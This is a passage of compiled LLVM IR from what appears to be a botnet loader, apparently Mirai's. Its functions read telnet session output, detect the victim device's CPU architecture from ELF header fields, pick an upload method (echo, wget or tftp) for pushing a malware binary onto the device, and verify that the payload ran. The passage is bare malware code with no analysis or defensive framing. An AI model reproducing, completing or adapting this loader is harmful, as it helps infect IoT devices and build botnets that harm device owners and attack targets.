  %122 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %121, i32 0, i32 2
  %123 = load i16, i16* %122, align 1
  %124 = zext i16 %123 to i32
  %125 = icmp eq i32 %124, 62
  br i1 %125, label %126, label %132

; <label>:126:                                    ; preds = %120, %114, %108, %102
  %127 = load %struct.connection*, %struct.connection** %3, align 8
  %128 = getelementptr inbounds %struct.connection, %struct.connection* %127, i32 0, i32 3
  %129 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %128, i32 0, i32 2
  %130 = getelementptr inbounds [6 x i8], [6 x i8]* %129, i32 0, i32 0
  %131 = call i8* @strcpy(i8* %130, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.25, i32 0, i32 0)) #5
  br label %214

; <label>:132:                                    ; preds = %120
  %133 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %134 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %133, i32 0, i32 2
  %135 = load i16, i16* %134, align 1
  %136 = zext i16 %135 to i32
  %137 = icmp eq i32 %136, 2
  br i1 %137, label %150, label %138

; <label>:138:                                    ; preds = %132
  %139 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %140 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %139, i32 0, i32 2
  %141 = load i16, i16* %140, align 1
  %142 = zext i16 %141 to i32
  %143 = icmp eq i32 %142, 18
  br i1 %143, label %150, label %144

; <label>:144:                                    ; preds = %138
  %145 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %146 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %145, i32 0, i32 2
  %147 = load i16, i16* %146, align 1
  %148 = zext i16 %147 to i32
  %149 = icmp eq i32 %148, 43
  br i1 %149, label %150, label %156

; <label>:150:                                    ; preds = %144, %138, %132
  %151 = load %struct.connection*, %struct.connection** %3, align 8
  %152 = getelementptr inbounds %struct.connection, %struct.connection* %151, i32 0, i32 3
  %153 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %152, i32 0, i32 2
  %154 = getelementptr inbounds [6 x i8], [6 x i8]* %153, i32 0, i32 0
  %155 = call i8* @strcpy(i8* %154, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.26, i32 0, i32 0)) #5
  br label %213

; <label>:156:                                    ; preds = %144
  %157 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %158 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %157, i32 0, i32 2
  %159 = load i16, i16* %158, align 1
  %160 = zext i16 %159 to i32
  %161 = icmp eq i32 %160, 4
  br i1 %161, label %168, label %162

; <label>:162:                                    ; preds = %156
  %163 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %164 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %163, i32 0, i32 2
  %165 = load i16, i16* %164, align 1
  %166 = zext i16 %165 to i32
  %167 = icmp eq i32 %166, 5
  br i1 %167, label %168, label %174

; <label>:168:                                    ; preds = %162, %156
  %169 = load %struct.connection*, %struct.connection** %3, align 8
  %170 = getelementptr inbounds %struct.connection, %struct.connection* %169, i32 0, i32 3
  %171 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %170, i32 0, i32 2
  %172 = getelementptr inbounds [6 x i8], [6 x i8]* %171, i32 0, i32 0
  %173 = call i8* @strcpy(i8* %172, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.27, i32 0, i32 0)) #5
  br label %212

; <label>:174:                                    ; preds = %162
  %175 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %176 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %175, i32 0, i32 2
  %177 = load i16, i16* %176, align 1
  %178 = zext i16 %177 to i32
  %179 = icmp eq i32 %178, 20
  br i1 %179, label %186, label %180

; <label>:180:                                    ; preds = %174
  %181 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %182 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %181, i32 0, i32 2
  %183 = load i16, i16* %182, align 1
  %184 = zext i16 %183 to i32
  %185 = icmp eq i32 %184, 21
  br i1 %185, label %186, label %192

; <label>:186:                                    ; preds = %180, %174
  %187 = load %struct.connection*, %struct.connection** %3, align 8
  %188 = getelementptr inbounds %struct.connection, %struct.connection* %187, i32 0, i32 3
  %189 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %188, i32 0, i32 2
  %190 = getelementptr inbounds [6 x i8], [6 x i8]* %189, i32 0, i32 0
  %191 = call i8* @strcpy(i8* %190, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.28, i32 0, i32 0)) #5
  br label %211

; <label>:192:                                    ; preds = %180
  %193 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %194 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %193, i32 0, i32 2
  %195 = load i16, i16* %194, align 1
  %196 = zext i16 %195 to i32
  %197 = icmp eq i32 %196, 42
  br i1 %197, label %198, label %204

; <label>:198:                                    ; preds = %192
  %199 = load %struct.connection*, %struct.connection** %3, align 8
  %200 = getelementptr inbounds %struct.connection, %struct.connection* %199, i32 0, i32 3
  %201 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %200, i32 0, i32 2
  %202 = getelementptr inbounds [6 x i8], [6 x i8]* %201, i32 0, i32 0
  %203 = call i8* @strcpy(i8* %202, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.29, i32 0, i32 0)) #5
  br label %210

; <label>:204:                                    ; preds = %192
  %205 = load %struct.connection*, %struct.connection** %3, align 8
  %206 = getelementptr inbounds %struct.connection, %struct.connection* %205, i32 0, i32 3
  %207 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %206, i32 0, i32 2
  %208 = getelementptr inbounds [6 x i8], [6 x i8]* %207, i64 0, i64 0
  store i8 0, i8* %208, align 8
  %209 = load %struct.connection*, %struct.connection** %3, align 8
  call void @connection_close(%struct.connection* %209)
  br label %210

; <label>:210:                                    ; preds = %204, %198
  br label %211

; <label>:211:                                    ; preds = %210, %186
  br label %212

; <label>:212:                                    ; preds = %211, %168
  br label %213

; <label>:213:                                    ; preds = %212, %150
  br label %214

; <label>:214:                                    ; preds = %213, %126
  br label %215

; <label>:215:                                    ; preds = %214, %101
  br label %216

; <label>:216:                                    ; preds = %215, %64
  br label %256

; <label>:217:                                    ; preds = %1
  %218 = load %struct.connection*, %struct.connection** %3, align 8
  %219 = getelementptr inbounds %struct.connection, %struct.connection* %218, i32 0, i32 15
  %220 = getelementptr inbounds [8192 x i8], [8192 x i8]* %219, i32 0, i32 0
  %221 = load %struct.connection*, %struct.connection** %3, align 8
  %222 = getelementptr inbounds %struct.connection, %struct.connection* %221, i32 0, i32 9
  %223 = load i16, i16* %222, align 8
  %224 = zext i16 %223 to i32
  %225 = call i32 @util_memsearch(i8* %220, i32 %224, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.8, i32 0, i32 0), i32 23)
  store i32 %225, i32* %6, align 4
  %226 = icmp ne i32 %225, -1
  br i1 %226, label %227, label %229

; <label>:227:                                    ; preds = %217
  %228 = load i32, i32* %6, align 4
  store i32 %228, i32* %2, align 4
  br label %257

; <label>:229:                                    ; preds = %217
  %230 = load %struct.connection*, %struct.connection** %3, align 8
  %231 = getelementptr inbounds %struct.connection, %struct.connection* %230, i32 0, i32 9
  %232 = load i16, i16* %231, align 8
  %233 = zext i16 %232 to i32
  %234 = icmp sgt i32 %233, 7168
  br i1 %234, label %235, label %255

; <label>:235:                                    ; preds = %229
  %236 = load %struct.connection*, %struct.connection** %3, align 8
  %237 = getelementptr inbounds %struct.connection, %struct.connection* %236, i32 0, i32 15
  %238 = getelementptr inbounds [8192 x i8], [8192 x i8]* %237, i32 0, i32 0
  %239 = load %struct.connection*, %struct.connection** %3, align 8
  %240 = getelementptr inbounds %struct.connection, %struct.connection* %239, i32 0, i32 15
  %241 = getelementptr inbounds [8192 x i8], [8192 x i8]* %240, i32 0, i32 0
  %242 = getelementptr inbounds i8, i8* %241, i64 6144
  %243 = load %struct.connection*, %struct.connection** %3, align 8
  %244 = getelementptr inbounds %struct.connection, %struct.connection* %243, i32 0, i32 9
  %245 = load i16, i16* %244, align 8
  %246 = zext i16 %245 to i32
  %247 = sub nsw i32 %246, 6144
  %248 = sext i32 %247 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %238, i8* %242, i64 %248, i32 1, i1 false)
  %249 = load %struct.connection*, %struct.connection** %3, align 8
  %250 = getelementptr inbounds %struct.connection, %struct.connection* %249, i32 0, i32 9
  %251 = load i16, i16* %250, align 8
  %252 = zext i16 %251 to i32
  %253 = sub nsw i32 %252, 6144
  %254 = trunc i32 %253 to i16
  store i16 %254, i16* %250, align 8
  br label %255

; <label>:255:                                    ; preds = %235, %229
  br label %256

; <label>:256:                                    ; preds = %255, %216
  store i32 0, i32* %2, align 4
  br label %257

; <label>:257:                                    ; preds = %256, %227, %41, %22
  %258 = load i32, i32* %2, align 4
  ret i32 %258
}

declare i32 @htons(...) #3

; Function Attrs: noinline nounwind uwtable
define i32 @connection_consume_arm_subtype(%struct.connection*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.connection*, align 8
  %4 = alloca i32, align 4
  store %struct.connection* %0, %struct.connection** %3, align 8
  %5 = load %struct.connection*, %struct.connection** %3, align 8
  %6 = getelementptr inbounds %struct.connection, %struct.connection* %5, i32 0, i32 15
  %7 = getelementptr inbounds [8192 x i8], [8192 x i8]* %6, i32 0, i32 0
  %8 = load %struct.connection*, %struct.connection** %3, align 8
  %9 = getelementptr inbounds %struct.connection, %struct.connection* %8, i32 0, i32 9
  %10 = load i16, i16* %9, align 8
  %11 = zext i16 %10 to i32
  %12 = call i32 @util_memsearch(i8* %7, i32 %11, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.8, i32 0, i32 0), i32 23)
  store i32 %12, i32* %4, align 4
  %13 = load i32, i32* %4, align 4
  %14 = icmp eq i32 %13, -1
  br i1 %14, label %15, label %16

; <label>:15:                                     ; preds = %1
  store i32 0, i32* %2, align 4
  br label %38

; <label>:16:                                     ; preds = %1
  %17 = load %struct.connection*, %struct.connection** %3, align 8
  %18 = getelementptr inbounds %struct.connection, %struct.connection* %17, i32 0, i32 15
  %19 = getelementptr inbounds [8192 x i8], [8192 x i8]* %18, i32 0, i32 0
  %20 = load i32, i32* %4, align 4
  %21 = call i32 @util_memsearch(i8* %19, i32 %20, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.30, i32 0, i32 0), i32 5)
  %22 = icmp ne i32 %21, -1
  br i1 %22, label %30, label %23

; <label>:23:                                     ; preds = %16
  %24 = load %struct.connection*, %struct.connection** %3, align 8
  %25 = getelementptr inbounds %struct.connection, %struct.connection* %24, i32 0, i32 15
  %26 = getelementptr inbounds [8192 x i8], [8192 x i8]* %25, i32 0, i32 0
  %27 = load i32, i32* %4, align 4
  %28 = call i32 @util_memsearch(i8* %26, i32 %27, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.31, i32 0, i32 0), i32 5)
  %29 = icmp ne i32 %28, -1
  br i1 %29, label %30, label %36

; <label>:30:                                     ; preds = %23, %16
  %31 = load %struct.connection*, %struct.connection** %3, align 8
  %32 = getelementptr inbounds %struct.connection, %struct.connection* %31, i32 0, i32 3
  %33 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %32, i32 0, i32 2
  %34 = getelementptr inbounds [6 x i8], [6 x i8]* %33, i32 0, i32 0
  %35 = call i8* @strcpy(i8* %34, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.32, i32 0, i32 0)) #5
  br label %36

; <label>:36:                                     ; preds = %30, %23
  %37 = load i32, i32* %4, align 4
  store i32 %37, i32* %2, align 4
  br label %38

; <label>:38:                                     ; preds = %36, %15
  %39 = load i32, i32* %2, align 4
  ret i32 %39
}

; Function Attrs: noinline nounwind uwtable
define i32 @connection_consume_upload_methods(%struct.connection*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.connection*, align 8
  %4 = alloca i32, align 4
  store %struct.connection* %0, %struct.connection** %3, align 8
  %5 = load %struct.connection*, %struct.connection** %3, align 8
  %6 = getelementptr inbounds %struct.connection, %struct.connection* %5, i32 0, i32 15
  %7 = getelementptr inbounds [8192 x i8], [8192 x i8]* %6, i32 0, i32 0
  %8 = load %struct.connection*, %struct.connection** %3, align 8
  %9 = getelementptr inbounds %struct.connection, %struct.connection* %8, i32 0, i32 9
  %10 = load i16, i16* %9, align 8
  %11 = zext i16 %10 to i32
  %12 = call i32 @util_memsearch(i8* %7, i32 %11, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.8, i32 0, i32 0), i32 23)
  store i32 %12, i32* %4, align 4
  %13 = load i32, i32* %4, align 4
  %14 = icmp eq i32 %13, -1
  br i1 %14, label %15, label %16

; <label>:15:                                     ; preds = %1
  store i32 0, i32* %2, align 4
  br label %45

; <label>:16:                                     ; preds = %1
  %17 = load %struct.connection*, %struct.connection** %3, align 8
  %18 = getelementptr inbounds %struct.connection, %struct.connection* %17, i32 0, i32 15
  %19 = getelementptr inbounds [8192 x i8], [8192 x i8]* %18, i32 0, i32 0
  %20 = load i32, i32* %4, align 4
  %21 = call i32 @util_memsearch(i8* %19, i32 %20, i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.33, i32 0, i32 0), i32 22)
  %22 = icmp eq i32 %21, -1
  br i1 %22, label %23, label %27

; <label>:23:                                     ; preds = %16
  %24 = load %struct.connection*, %struct.connection** %3, align 8
  %25 = getelementptr inbounds %struct.connection, %struct.connection* %24, i32 0, i32 3
  %26 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %25, i32 0, i32 6
  store i32 1, i32* %26, align 8
  br label %43

; <label>:27:                                     ; preds = %16
  %28 = load %struct.connection*, %struct.connection** %3, align 8
  %29 = getelementptr inbounds %struct.connection, %struct.connection* %28, i32 0, i32 15
  %30 = getelementptr inbounds [8192 x i8], [8192 x i8]* %29, i32 0, i32 0
  %31 = load i32, i32* %4, align 4
  %32 = call i32 @util_memsearch(i8* %30, i32 %31, i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.34, i32 0, i32 0), i32 22)
  %33 = icmp eq i32 %32, -1
  br i1 %33, label %34, label %38

; <label>:34:                                     ; preds = %27
  %35 = load %struct.connection*, %struct.connection** %3, align 8
  %36 = getelementptr inbounds %struct.connection, %struct.connection* %35, i32 0, i32 3
  %37 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %36, i32 0, i32 6
  store i32 2, i32* %37, align 8
  br label %42

; <label>:38:                                     ; preds = %27
  %39 = load %struct.connection*, %struct.connection** %3, align 8
  %40 = getelementptr inbounds %struct.connection, %struct.connection* %39, i32 0, i32 3
  %41 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %40, i32 0, i32 6
  store i32 0, i32* %41, align 8
  br label %42

; <label>:42:                                     ; preds = %38, %34
  br label %43

; <label>:43:                                     ; preds = %42, %23
  %44 = load i32, i32* %4, align 4
  store i32 %44, i32* %2, align 4
  br label %45

; <label>:45:                                     ; preds = %43, %15
  %46 = load i32, i32* %2, align 4
  ret i32 %46
}

; Function Attrs: noinline nounwind uwtable
define i32 @connection_upload_echo(%struct.connection*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.connection*, align 8
  %4 = alloca i32, align 4
  store %struct.connection* %0, %struct.connection** %3, align 8
  %5 = load %struct.connection*, %struct.connection** %3, align 8
  %6 = getelementptr inbounds %struct.connection, %struct.connection* %5, i32 0, i32 15
  %7 = getelementptr inbounds [8192 x i8], [8192 x i8]* %6, i32 0, i32 0
  %8 = load %struct.connection*, %struct.connection** %3, align 8
  %9 = getelementptr inbounds %struct.connection, %struct.connection* %8, i32 0, i32 9
  %10 = load i16, i16* %9, align 8
  %11 = zext i16 %10 to i32
  %12 = call i32 @util_memsearch(i8* %7, i32 %11, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.8, i32 0, i32 0), i32 23)
  store i32 %12, i32* %4, align 4
  %13 = load i32, i32* %4, align 4
  %14 = icmp eq i32 %13, -1
  br i1 %14, label %15, label %16

; <label>:15:                                     ; preds = %1
  store i32 0, i32* %2, align 4
  br label %83

; <label>:16:                                     ; preds = %1
  %17 = load %struct.connection*, %struct.connection** %3, align 8
  %18 = getelementptr inbounds %struct.connection, %struct.connection* %17, i32 0, i32 2
  %19 = load %struct.binary*, %struct.binary** %18, align 8
  %20 = icmp eq %struct.binary* %19, null
  br i1 %20, label %21, label %23

; <label>:21:                                     ; preds = %16
  %22 = load %struct.connection*, %struct.connection** %3, align 8
  call void @connection_close(%struct.connection* %22)
  store i32 0, i32* %2, align 4
  br label %83

; <label>:23:                                     ; preds = %16
  %24 = load %struct.connection*, %struct.connection** %3, align 8
  %25 = getelementptr inbounds %struct.connection, %struct.connection* %24, i32 0, i32 5
  %26 = load i32, i32* %25, align 4
  %27 = load %struct.connection*, %struct.connection** %3, align 8
  %28 = getelementptr inbounds %struct.connection, %struct.connection* %27, i32 0, i32 2
  %29 = load %struct.binary*, %struct.binary** %28, align 8
  %30 = getelementptr inbounds %struct.binary, %struct.binary* %29, i32 0, i32 1
  %31 = load i32, i32* %30, align 8
  %32 = icmp eq i32 %26, %31
  br i1 %32, label %33, label %35

; <label>:33:                                     ; preds = %23
  %34 = load i32, i32* %4, align 4
  store i32 %34, i32* %2, align 4
  br label %83

; <label>:35:                                     ; preds = %23
  %36 = load %struct.connection*, %struct.connection** %3, align 8
  %37 = getelementptr inbounds %struct.connection, %struct.connection* %36, i32 0, i32 4
  %38 = load i32, i32* %37, align 8
  %39 = load %struct.connection*, %struct.connection** %3, align 8
  %40 = getelementptr inbounds %struct.connection, %struct.connection* %39, i32 0, i32 2
  %41 = load %struct.binary*, %struct.binary** %40, align 8
  %42 = getelementptr inbounds %struct.binary, %struct.binary* %41, i32 0, i32 2
  %43 = load i8**, i8*** %42, align 8
  %44 = load %struct.connection*, %struct.connection** %3, align 8
  %45 = getelementptr inbounds %struct.connection, %struct.connection* %44, i32 0, i32 5
  %46 = load i32, i32* %45, align 4
  %47 = sext i32 %46 to i64
  %48 = getelementptr inbounds i8*, i8** %43, i64 %47
  %49 = load i8*, i8** %48, align 8
  %50 = load %struct.connection*, %struct.connection** %3, align 8
  %51 = getelementptr inbounds %struct.connection, %struct.connection* %50, i32 0, i32 5
  %52 = load i32, i32* %51, align 4
  %53 = icmp eq i32 %52, 0
  %54 = select i1 %53, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.36, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.37, i32 0, i32 0)
  %55 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %38, i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.35, i32 0, i32 0), i8* %49, i8* %54)
  %56 = load %struct.connection*, %struct.connection** %3, align 8
  %57 = getelementptr inbounds %struct.connection, %struct.connection* %56, i32 0, i32 5
  %58 = load i32, i32* %57, align 4
  %59 = add nsw i32 %58, 1
  store i32 %59, i32* %57, align 4
  %60 = load %struct.connection*, %struct.connection** %3, align 8
  %61 = getelementptr inbounds %struct.connection, %struct.connection* %60, i32 0, i32 15
  %62 = getelementptr inbounds [8192 x i8], [8192 x i8]* %61, i32 0, i32 0
  %63 = load %struct.connection*, %struct.connection** %3, align 8
  %64 = getelementptr inbounds %struct.connection, %struct.connection* %63, i32 0, i32 15
  %65 = getelementptr inbounds [8192 x i8], [8192 x i8]* %64, i32 0, i32 0
  %66 = load i32, i32* %4, align 4
  %67 = sext i32 %66 to i64
  %68 = getelementptr inbounds i8, i8* %65, i64 %67
  %69 = load %struct.connection*, %struct.connection** %3, align 8
  %70 = getelementptr inbounds %struct.connection, %struct.connection* %69, i32 0, i32 9
  %71 = load i16, i16* %70, align 8
  %72 = zext i16 %71 to i32
  %73 = load i32, i32* %4, align 4
  %74 = sub nsw i32 %72, %73
  %75 = sext i32 %74 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %62, i8* %68, i64 %75, i32 1, i1 false)
  %76 = load i32, i32* %4, align 4
  %77 = load %struct.connection*, %struct.connection** %3, align 8
  %78 = getelementptr inbounds %struct.connection, %struct.connection* %77, i32 0, i32 9
  %79 = load i16, i16* %78, align 8
  %80 = zext i16 %79 to i32
  %81 = sub nsw i32 %80, %76
  %82 = trunc i32 %81 to i16
  store i16 %82, i16* %78, align 8
  store i32 0, i32* %2, align 4
  br label %83

; <label>:83:                                     ; preds = %35, %33, %21, %15
  %84 = load i32, i32* %2, align 4
  ret i32 %84
}

; Function Attrs: noinline nounwind uwtable
define i32 @connection_upload_wget(%struct.connection*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.connection*, align 8
  %4 = alloca i32, align 4
  store %struct.connection* %0, %struct.connection** %3, align 8
  %5 = load %struct.connection*, %struct.connection** %3, align 8
  %6 = getelementptr inbounds %struct.connection, %struct.connection* %5, i32 0, i32 15
  %7 = getelementptr inbounds [8192 x i8], [8192 x i8]* %6, i32 0, i32 0
  %8 = load %struct.connection*, %struct.connection** %3, align 8
  %9 = getelementptr inbounds %struct.connection, %struct.connection* %8, i32 0, i32 9
  %10 = load i16, i16* %9, align 8
  %11 = zext i16 %10 to i32
  %12 = call i32 @util_memsearch(i8* %7, i32 %11, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.8, i32 0, i32 0), i32 23)
  store i32 %12, i32* %4, align 4
  %13 = load i32, i32* %4, align 4
  %14 = icmp eq i32 %13, -1
  br i1 %14, label %15, label %16

; <label>:15:                                     ; preds = %1
  store i32 0, i32* %2, align 4
  br label %18

; <label>:16:                                     ; preds = %1
  %17 = load i32, i32* %4, align 4
  store i32 %17, i32* %2, align 4
  br label %18

; <label>:18:                                     ; preds = %16, %15
  %19 = load i32, i32* %2, align 4
  ret i32 %19
}

; Function Attrs: noinline nounwind uwtable
define i32 @connection_upload_tftp(%struct.connection*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.connection*, align 8
  %4 = alloca i32, align 4
  store %struct.connection* %0, %struct.connection** %3, align 8
  %5 = load %struct.connection*, %struct.connection** %3, align 8
  %6 = getelementptr inbounds %struct.connection, %struct.connection* %5, i32 0, i32 15
  %7 = getelementptr inbounds [8192 x i8], [8192 x i8]* %6, i32 0, i32 0
  %8 = load %struct.connection*, %struct.connection** %3, align 8
  %9 = getelementptr inbounds %struct.connection, %struct.connection* %8, i32 0, i32 9
  %10 = load i16, i16* %9, align 8
  %11 = zext i16 %10 to i32
  %12 = call i32 @util_memsearch(i8* %7, i32 %11, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.8, i32 0, i32 0), i32 23)
  store i32 %12, i32* %4, align 4
  %13 = load i32, i32* %4, align 4
  %14 = icmp eq i32 %13, -1
  br i1 %14, label %15, label %16

; <label>:15:                                     ; preds = %1
  store i32 0, i32* %2, align 4
  br label %48

; <label>:16:                                     ; preds = %1
  %17 = load %struct.connection*, %struct.connection** %3, align 8
  %18 = getelementptr inbounds %struct.connection, %struct.connection* %17, i32 0, i32 15
  %19 = getelementptr inbounds [8192 x i8], [8192 x i8]* %18, i32 0, i32 0
  %20 = load i32, i32* %4, align 4
  %21 = call i32 @util_memsearch(i8* %19, i32 %20, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.38, i32 0, i32 0), i32 17)
  %22 = icmp ne i32 %21, -1
  br i1 %22, label %23, label %26

; <label>:23:                                     ; preds = %16
  %24 = load i32, i32* %4, align 4
  %25 = mul nsw i32 %24, -1
  store i32 %25, i32* %2, align 4
  br label %48

; <label>:26:                                     ; preds = %16
  %27 = load %struct.connection*, %struct.connection** %3, align 8
  %28 = getelementptr inbounds %struct.connection, %struct.connection* %27, i32 0, i32 15
  %29 = getelementptr inbounds [8192 x i8], [8192 x i8]* %28, i32 0, i32 0
  %30 = load i32, i32* %4, align 4
  %31 = call i32 @util_memsearch(i8* %29, i32 %30, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.39, i32 0, i32 0), i32 7)
  %32 = icmp ne i32 %31, -1
  br i1 %32, label %33, label %36

; <label>:33:                                     ; preds = %26
  %34 = load i32, i32* %4, align 4
  %35 = mul nsw i32 %34, -1
  store i32 %35, i32* %2, align 4
  br label %48

; <label>:36:                                     ; preds = %26
  %37 = load %struct.connection*, %struct.connection** %3, align 8
  %38 = getelementptr inbounds %struct.connection, %struct.connection* %37, i32 0, i32 15
  %39 = getelementptr inbounds [8192 x i8], [8192 x i8]* %38, i32 0, i32 0
  %40 = load i32, i32* %4, align 4
  %41 = call i32 @util_memsearch(i8* %39, i32 %40, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.40, i32 0, i32 0), i32 14)
  %42 = icmp ne i32 %41, -1
  br i1 %42, label %43, label %46

; <label>:43:                                     ; preds = %36
  %44 = load i32, i32* %4, align 4
  %45 = mul nsw i32 %44, -1
  store i32 %45, i32* %2, align 4
  br label %48

; <label>:46:                                     ; preds = %36
  %47 = load i32, i32* %4, align 4
  store i32 %47, i32* %2, align 4
  br label %48

; <label>:48:                                     ; preds = %46, %43, %33, %23, %15
  %49 = load i32, i32* %2, align 4
  ret i32 %49
}

; Function Attrs: noinline nounwind uwtable
define i32 @connection_verify_payload(%struct.connection*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.connection*, align 8
  %4 = alloca i32, align 4
  store %struct.connection* %0, %struct.connection** %3, align 8
  %5 = load %struct.connection*, %struct.connection** %3, align 8
  %6 = getelementptr inbounds %struct.connection, %struct.connection* %5, i32 0, i32 15
  %7 = getelementptr inbounds [8192 x i8], [8192 x i8]* %6, i32 0, i32 0
  %8 = load %struct.connection*, %struct.connection** %3, align 8
  %9 = getelementptr inbounds %struct.connection, %struct.connection* %8, i32 0, i32 9
  %10 = load i16, i16* %9, align 8
  %11 = zext i16 %10 to i32
  %12 = call i32 @util_memsearch(i8* %7, i32 %11, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.41, i32 0, i32 0), i32 23)
  store i32 %12, i32* %4, align 4
  %13 = load i32, i32* %4, align 4
  %14 = icmp eq i32 %13, -1
  br i1 %14, label %15, label %16

; <label>:15:                                     ; preds = %1
  store i32 0, i32* %2, align 4
  br label %28

; <label>:16:                                     ; preds = %1
  %17 = load %struct.connection*, %struct.connection** %3, align 8
  %18 = getelementptr inbounds %struct.connection, %struct.connection* %17, i32 0, i32 15
  %19 = getelementptr inbounds [8192 x i8], [8192 x i8]* %18, i32 0, i32 0
  %20 = load i32, i32* %4, align 4
  %21 = call i32 @util_memsearch(i8* %19, i32 %20, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.42, i32 0, i32 0), i32 14)
  %22 = icmp eq i32 %21, -1
  br i1 %22, label %23, label %25

; <label>:23:                                     ; preds = %16
  %24 = load i32, i32* %4, align 4
  store i32 %24, i32* %2, align 4
  br label %28

; <label>:25:                                     ; preds = %16
  %26 = load i32, i32* %4, align 4
  %27 = add nsw i32 255, %26
  store i32 %27, i32* %2, align 4
  br label %28

; <label>:28:                                     ; preds = %25, %23, %15
  %29 = load i32, i32* %2, align 4
  ret i32 %29
}

; Function Attrs: noinline nounwind uwtable
define i32 @connection_consume_cleanup(%struct.connection*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.connection*, align 8
  %4 = alloca i32, align 4
  store %struct.connection* %0, %struct.connection** %3, align 8
  %5 = load %struct.connection*, %struct.connection** %3, align 8
  %6 = getelementptr inbounds %struct.connection, %struct.connection* %5, i32 0, i32 15
  %7 = getelementptr inbounds [8192 x i8], [8192 x i8]* %6, i32 0, i32 0
  %8 = load %struct.connection*, %struct.connection** %3, align 8
  %9 = getelementptr inbounds %struct.connection, %struct.connection* %8, i32 0, i32 9
  %10 = load i16, i16* %9, align 8
  %11 = zext i16 %10 to i32
  %12 = call i32 @util_memsearch(i8* %7, i32 %11, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.8, i32 0, i32 0), i32 23)
  store i32 %12, i32* %4, align 4
  %13 = load i32, i32* %4, align 4
  %14 = icmp eq i32 %13, -1
  br i1 %14, label %15, label %16

; <label>:15:                                     ; preds = %1
  store i32 0, i32* %2, align 4
  br label %18

; <label>:16:                                     ; preds = %1
  %17 = load i32, i32* %4, align 4
  store i32 %17, i32* %2, align 4
  br label %18

; <label>:18:                                     ; preds = %16, %15
  %19 = load i32, i32* %2, align 4
  ret i32 %19
}

; Function Attrs: noinline nounwind uwtable
define i32 @util_memsearch(i8*, i32, i8*, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  store i8* %0, i8** %6, align 8
  store i32 %1, i32* %7, align 4
  store i8* %2, i8** %8, align 8
  store i32 %3, i32* %9, align 4
  store i32 0, i32* %11, align 4
  %12 = load i32, i32* %9, align 4
  %13 = load i32, i32* %7, align 4
  %14 = icmp sgt i32 %12, %13
  br i1 %14, label %15, label %16

; <label>:15:                                     ; preds = %4
  store i32 -1, i32* %5, align 4
  br label %50

; <label>:16:                                     ; preds = %4
  store i32 0, i32* %10, align 4
  br label %17

; <label>:17:                                     ; preds = %46, %16
  %18 = load i32, i32* %10, align 4
  %19 = load i32, i32* %7, align 4
  %20 = icmp slt i32 %18, %19
  br i1 %20, label %21, label %49

; <label>:21:                                     ; preds = %17
  %22 = load i8*, i8** %6, align 8
  %23 = load i32, i32* %10, align 4
  %24 = sext i32 %23 to i64
